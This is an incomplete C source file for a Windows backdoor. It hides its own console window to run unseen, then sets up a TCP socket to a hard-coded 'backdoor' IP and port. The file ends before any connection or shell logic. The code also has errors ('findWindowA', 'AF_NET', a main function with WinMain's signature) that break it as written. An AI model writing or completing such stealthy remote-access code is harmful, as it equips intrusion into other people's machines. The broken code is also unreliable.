#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h> // socket programming
#include <windows.h> // windows library
#include <winuser.h> // windows users
#include <wininet.h> // network library
#include <windowsx.h>
#include <string.h> // string manipulation
#include <sys/stat.h>
#include <sys/types.h>

// global socket
int sock;

// windows entrypoint
int APIENTRY main(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
  HWND stealth; // make it invisible
  AllocConsole(); // new console
  stealth = findWindowA("ConsoleWindowClass", NULL); // handle to the top level Window
  ShowWindow(stealth, 0); // 0 is the nCmdShow

  struct sockaddr_in address; // Server Address
  unsigned short port; // port
  char *ip; // pointer to the server IP
  WSADATA wsaData; // windows socket object

  // IP for backdoor
  ip = "192.168.1.10";
  port = 6969;

  // check for sock initialization
  if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
    exit(1);
  }

  // defining socket object TCP
  sock = socket(AF_INET, SOCK_STREAM, 0);
  // defining sock params
  memset(&address, 0, sizeof(address)); // filling with zeros (memory, params and length)
  address.sin_family = AF_NET; // ipv4
  address.sin_addr.s_addr = inet_addr(ip); // IP address
  address.sin_port = htons(port); // port
}
